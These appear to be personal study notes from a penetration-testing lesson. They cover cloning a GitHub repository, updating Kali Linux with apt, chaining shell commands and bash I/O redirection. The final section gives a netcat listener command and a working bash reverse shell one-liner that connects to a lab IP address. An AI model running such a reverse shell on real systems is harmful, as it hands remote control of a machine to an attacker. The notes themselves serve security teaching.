# Notes for 2019-10-10

## Github
git clone https://github.com/gregdykes/purple
Note: you can also pull the zip file from the website.

## Updating Kali Linux (as root)
To install a single package...
apt install <PACKAGE-NAME>

Updating Kali...
apt update
apt list --upgradable
apt upgrade
apt dist-upgrade <-- For installing all kept packages
apt autoremove

## Chaining Commands
By using a ; after a command you can string them along like so...

ping -c 3 127.0.0.1; ifconfig; uname -a

This will execute each command one after...

## Bash io redirection
https://www.tldp.org/LDP/abs/html/io-redirection.html
>
>>
<
|
0 = stdin
1 = stdout
2 = stderr


## Reverse shells
Start a listener using netcat:
nc -nlvp 4444

bash -i >& /dev/tcp/192.168.56.101/4444 0>&1



